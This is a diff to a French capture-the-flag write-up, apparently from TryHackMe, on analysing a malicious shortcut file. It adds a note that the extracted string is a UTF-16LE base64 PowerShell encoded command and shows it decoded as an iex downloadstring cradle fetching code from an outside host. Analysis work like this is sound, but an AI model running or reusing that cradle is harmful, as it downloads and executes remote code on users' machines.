@@ -62,6 +62,13 @@ On utilise la commande lnkparse Invoice_20230103.lnk et on récupére la chaine 
 
 réponse : aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA
 
+Note : C’est du base64 encodé en UTF-16LE (-EncodedCommand de PowerShell).
+
+![Tryhackme](00-Images/decode.png)
+
+La chaine donne iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
+
+
 
 
 
